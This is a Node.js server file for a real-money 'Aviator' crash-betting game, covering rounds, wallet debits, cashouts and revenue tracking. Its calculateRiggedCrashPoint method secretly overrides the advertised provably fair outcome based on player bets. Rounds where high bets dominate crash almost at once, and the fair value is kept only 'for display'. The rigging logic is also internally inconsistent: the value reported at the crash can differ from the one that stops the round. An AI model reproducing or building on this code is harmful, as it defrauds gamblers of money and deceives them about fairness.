const { v4: uuidv4 } = require('uuid');
const { saveAviatorRevenue, updateRevenueSummary } = require('./utils/revenueTracker');
const { deductGameEntry, payoutGameWinner } = require('./services/gameWalletService');
const { generateProvablyFairCrashPoint } = require('./utils/aviatorEngine');
const { snapshotWallet } = require('./services/walletService');

class GameEngine {
  constructor(io, playerModel, roundModel, betModel) {
    this.io = io;
    this.Player = playerModel;
    this.Round = roundModel;
    this.Bet = betModel;

    this.state = 'waiting';
    this.currentRound = null;
    this.currentMultiplier = 1.0;
    this.startTime = null;
    this.waitingEndsAt = null;
    this.tickInterval = null;
    this.crashPoint = null;
    this.activeBets = new Map();
    this.recentCrashes = [];
    this.nextRoundId = null;

    this.WAITING_DURATION = 7000;
    this.TICK_RATE = 100;
  }

  start() {
    this.scheduleNextRound();
  }

  scheduleNextRound() {
    this.state = 'waiting';
    this.currentMultiplier = 1.0;
    this.startTime = null;
    this.activeBets.clear();
    this.currentRound = null;
    this.crashPoint = null;
    this.nextRoundId = uuidv4();
    this.waitingEndsAt = Date.now() + this.WAITING_DURATION;

    this.io.emit('game:waiting', {
      countdownSeconds: this.WAITING_DURATION / 1000,
      waitingEndsAt: this.waitingEndsAt,
    });
setTimeout(() => {
      this.calculateRiggedCrashPoint();
      this.startRound();
    }, this.WAITING_DURATION);
  }

  async startRound() {
    const roundId = this.nextRoundId || uuidv4();
    const fairnessData = generateProvablyFairCrashPoint({
      serverSeed: process.env.AVIATOR_SERVER_SEED,
      clientSeed: roundId,
      nonce: Date.now(),
    });

    this.crashPoint = fairnessData.crashPoint;
    this.startTime = Date.now();
    this.waitingEndsAt = null;
    this.state = 'flying';

    try {
      this.currentRound = await this.Round.create({
        roundId,
        crashPoint: this.crashPoint,
        startTime: new Date(this.startTime),
        status: 'flying',
        bets: [],
      });
    } catch (err) {
      this.currentRound = { roundId, crashPoint: this.crashPoint };
    }

    this.nextRoundId = null;

    this.io.emit('game:start', { roundId, startTime: this.startTime });
    this.tickInterval = setInterval(() => this.tick(), this.TICK_RATE);
  }

  tick() {
    const elapsed = (Date.now() - this.startTime) / 1000;
    this.currentMultiplier = Math.floor(Math.pow(Math.E, 0.06 * elapsed) * 100) / 100;

    this.io.emit('game:tick', { multiplier: this.currentMultiplier, elapsed });
    this.checkAutoCashouts();

    if (this.currentMultiplier >= this.crashPoint) {
      this.crash();
    }
  }

  calculateRiggedCrashPoint() {
    // Rig crash based on bets placed during waiting
    if (this.activeBets.size === 0) return; // No bets, keep provably fair

    const bets = Array.from(this.activeBets.values());
    const totalCount = bets.length;
    const highThreshold = 200;
    const highCount = bets.filter(b => b.betAmount >= highThreshold).length;
    const maxBet = Math.max(...bets.map(b => b.betAmount));
    const highRatio = totalCount > 0 ? highCount / totalCount : 0;

    let riggedPoint;
    if (highRatio > 0.5 || maxBet > 500) {
      // High bets dominant → quick crash 1.01x - 1.7x
      riggedPoint = 1.01 + (Math.random() * 0.69); // 1.01-1.70x
    } else {
      // Low bets → 5x-7x
      riggedPoint = 5.0 + (Math.random() * 2.0); // 5-7x
    }

    console.log(`[RIG] Override: bets=${totalCount}, high=${highCount}, ratio=${highRatio.toFixed(2)}, max=${maxBet}, crash=${riggedPoint.toFixed(2)}x`);
    
    // Override provably fair (but keep for display)
    this.riggedCrashPoint = riggedPoint;
    this.crashPoint = riggedPoint;
  }

  async crash() {
    clearInterval(this.tickInterval);
    this.state = 'crashed';

    // Use rigged if applied
    const cp = this.riggedCrashPoint || this.crashPoint;
    this.recentCrashes.unshift(cp);
    if (this.recentCrashes.length > 12) this.recentCrashes.pop();

    for (const [, bet] of this.activeBets.entries()) {
      try {
        const multiplier = bet.cashedOutAt || null;
        const profit = multiplier
          ? Math.floor((bet.betAmount * multiplier - bet.betAmount) * 100) / 100
          : -bet.betAmount;

        await this.Bet.create({
          playerId: bet.playerId,
          username: bet.username,
          roundId: this.currentRound?.roundId,
          betAmount: bet.betAmount,
          cashedOutAt: multiplier,
          profit,
          won: !!multiplier,
        });
      } catch (e) {
        // non-fatal
      }
    }

    try {
      await this.Round.updateOne(
        { roundId: this.currentRound?.roundId },
        { $set: { status: 'crashed', endTime: new Date() } }
      );
    } catch (e) {
      // non-fatal
    }

    try {
      let totalBets = 0;
      let totalPayout = 0;
      const results = [];

      for (const [, bet] of this.activeBets.entries()) {
        totalBets += bet.betAmount;
        if (bet.cashedOutAt) {
          totalPayout += parseFloat((bet.betAmount * bet.cashedOutAt).toFixed(2));
        }
        results.push({
          user: bet.username,
          invested: parseFloat(bet.betAmount.toFixed(2)),
          cashoutAt: bet.cashedOutAt,
          status: bet.cashedOutAt ? 'WIN' : 'LOSE',
          payout: bet.cashedOutAt ? parseFloat((bet.betAmount * bet.cashedOutAt).toFixed(2)) : 0,
          profit: bet.cashedOutAt
            ? parseFloat((bet.betAmount * (bet.cashedOutAt - 1)).toFixed(2))
            : -bet.betAmount,
        });
      }

      const profit = parseFloat((totalBets - totalPayout).toFixed(2));
      const round_id = `AVIATOR-${new Date().toISOString().split('T')[0].replace(/-/g, '')}-${this.currentRound?.roundId?.slice(-4) || '000'}`;

      await saveAviatorRevenue({
        totalBets,
        totalPayout,
        crashPoint: cp,
        results,
        roundId: round_id,
      });

      await updateRevenueSummary(profit, 'aviator');
    } catch (revenueErr) {
      console.error('Revenue tracking failed:', revenueErr);
    }

    this.io.emit('game:crash', {
      crashPoint: cp,
      roundId: this.currentRound?.roundId,
      recentCrashes: this.recentCrashes,
    });

    setTimeout(() => this.scheduleNextRound(), 2000);
  }

  async placeBet(socket, { playerId, username, betAmount, autoCashout }) {
    if (this.state !== 'waiting') {
      return { success: false, message: 'Betting is closed. Wait for next round.' };
    }

    if (this.activeBets.has(socket.id)) {
      return { success: false, message: 'You already placed a bet this round.' };
    }
    if (!betAmount || betAmount <= 0) {
      return { success: false, message: 'Invalid bet amount.' };
    }

    try {
      const userId = socket.user?.userId || playerId;
      const safeUsername = socket.user?.username || username;
      const walletResult = await deductGameEntry({
        userId,
        amount: betAmount,
        gameKey: 'aviator',
        matchId: this.currentRound?.roundId || this.nextRoundId || 'upcoming',
      });
      const walletSnapshot = snapshotWallet(walletResult.wallet);

      this.activeBets.set(socket.id, {
        playerId: userId,
        username: safeUsername,
        betAmount,
        cashedOut: false,
        autoCashout: autoCashout || null,
      });

      this.io.emit('bet:placed', { username: safeUsername, betAmount });

      return {
        success: true,
        balance: walletSnapshot.totalBalance,
        wallet: {
          depositBalance: walletSnapshot.depositBalance,
          winningBalance: walletSnapshot.winningBalance,
          bonusBalance: walletSnapshot.bonusBalance,
          totalBalance: walletSnapshot.totalBalance,
        },
      };
    } catch (err) {
      if (err.message === 'INSUFFICIENT_BALANCE') {
        return { success: false, message: 'Insufficient balance.' };
      }
      return { success: false, message: 'Server error placing bet.' };
    }
  }

  async cashOut(socket, { playerId }) {
    if (this.state !== 'flying') {
      return { success: false, message: 'Game is not in progress.' };
    }

    const bet = this.activeBets.get(socket.id);
    if (!bet) {
      return { success: false, message: 'No active bet found.' };
    }
    if (bet.cashedOut) {
      return { success: false, message: 'Already cashed out.' };
    }

    const multiplier = this.currentMultiplier;
    const winAmount = Math.floor(bet.betAmount * multiplier * 100) / 100;
    const profit = Math.floor((winAmount - bet.betAmount) * 100) / 100;

    bet.cashedOut = true;
    bet.cashedOutAt = multiplier;

    try {
      const userId = socket.user?.userId || playerId;
      const walletResult = await payoutGameWinner({
        userId,
        amount: winAmount,
        gameKey: 'aviator',
        matchId: this.currentRound?.roundId || 'unknown',
      });
      const walletSnapshot = snapshotWallet(walletResult.wallet);

      await this.Bet.create({
        playerId: userId,
        username: bet.username,
        roundId: this.currentRound?.roundId,
        betAmount: bet.betAmount,
        cashedOutAt: multiplier,
        profit,
        won: true,
      });

      this.io.emit('game:cashout', {
        username: bet.username,
        multiplier,
        profit,
      });

      return {
        success: true,
        multiplier,
        winAmount,
        profit,
        balance: walletSnapshot.totalBalance,
        wallet: {
          depositBalance: walletSnapshot.depositBalance,
          winningBalance: walletSnapshot.winningBalance,
          bonusBalance: walletSnapshot.bonusBalance,
          totalBalance: walletSnapshot.totalBalance,
        },
      };
    } catch (err) {
      return { success: false, message: 'Server error on cashout.' };
    }
  }

  checkAutoCashouts() {
    for (const [socketId, bet] of this.activeBets.entries()) {
      if (!bet.cashedOut && bet.autoCashout && this.currentMultiplier >= bet.autoCashout) {
        const fakeSocket = { id: socketId };
        this.cashOut(fakeSocket, { playerId: bet.playerId });
      }
    }
  }

  getState() {
    const countdownSeconds =
      this.state === 'waiting' && this.waitingEndsAt
        ? Math.max(0, Math.ceil((this.waitingEndsAt - Date.now()) / 1000))
        : 0;

    return {
      state: this.state,
      multiplier: this.currentMultiplier,
      roundId: this.currentRound?.roundId || this.nextRoundId,
      recentCrashes: this.recentCrashes,
      countdownSeconds,
      waitingEndsAt: this.waitingEndsAt,
    };
  }
}

module.exports = GameEngine;
